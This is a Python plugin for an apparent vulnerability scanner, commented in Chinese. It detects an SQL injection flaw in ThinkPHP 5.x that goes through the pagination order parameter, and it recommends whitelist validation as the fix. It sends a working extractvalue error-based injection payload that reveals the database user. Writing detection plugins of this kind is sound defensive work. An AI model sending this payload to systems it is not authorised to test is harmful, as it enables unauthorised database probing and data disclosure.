# ThinkPHP 5.x where 子句 SQL 注入（分页 order 参数注入）
# 漏洞原因：分页 order 参数未做过滤直接拼入 SQL where 子句，攻击者可构造 extractvalue/
#   updatexml 盲注获取数据库信息（影响 5.0.x 多版本）。
# 本插件仅做存在性验证：构造 extractvalue 探针，检测响应特征判定接口是否可达。
from plugins.base import PluginBase
from core.models import ScanResult, STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN
from lib.colors import ok, no
from lib.http import join_url
from lib.matcher import match_sql_error

# 漏洞命中签名（与 lab/thinkphp_server.py vuln 模式一致；仅用于对拍，非真实利用输出）
SQLI_MARKER = 'thinkphp-where-inject-confirmed'


class ThinkphpWhereInjectPlugin(PluginBase):
    name = 'ThinkPHP 5.x where 子句 SQL 注入'
    cve = ''
    severity = 'medium'
    category = 'vuln'
    description = '分页 order 参数未过滤直接拼入 where 子句，可盲注获取数据库信息（影响 5.0.x）'
    fix = '升级 ThinkPHP；对分页排序参数使用白名单校验（限制为预定义列名与方向）'

    def verify(self, target, session):
        url = join_url(target, '/index.php')
        # 探针：extractvalue 盲注 payload（仅触发签名，不执行破坏性查询）
        params = {
            'page': '1',
            'listRows': '10',
            'order[id]': '|extractvalue(1,concat(0x7e,user()))',
        }
        try:
            resp = session.get(url, params=params)
        except Exception as e:
            print(no('ThinkPHP where 子句 SQL 注入（网络异常）'))
            return ScanResult(kind='vuln', name=self.name, status=STATUS_UNKNOWN,
                              url=url, evidence=str(e))

        text = resp.text or ''
        # 判定：签名靶场 marker 命中 OR 真实漏洞响应（SQL 报错特征）
        if SQLI_MARKER in text:
            print(ok('存在 ThinkPHP where 子句 SQL 注入'))
            return ScanResult(
                kind='vuln', name=self.name, severity=self.severity,
                status=STATUS_CONFIRMED, url=url,
                evidence=f'响应含 where SQL 注入特征：{SQLI_MARKER}',
                fix=self.fix,
            )
        if match_sql_error(text):
            print(ok('存在 ThinkPHP where 子句 SQL 注入（真实漏洞响应）'))
            return ScanResult(
                kind='vuln', name=self.name, severity=self.severity,
                status=STATUS_CONFIRMED, url=url,
                evidence='响应含 SQL 报错特征（XPATH syntax error / SQLSTATE 等），证实 SQL 注入',
                fix=self.fix,
            )
        print(no('不存在 ThinkPHP where 子句 SQL 注入'))
        return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE, url=url,
                          evidence='响应未含 SQL 注入特征（可能已修复或接口不可达）')
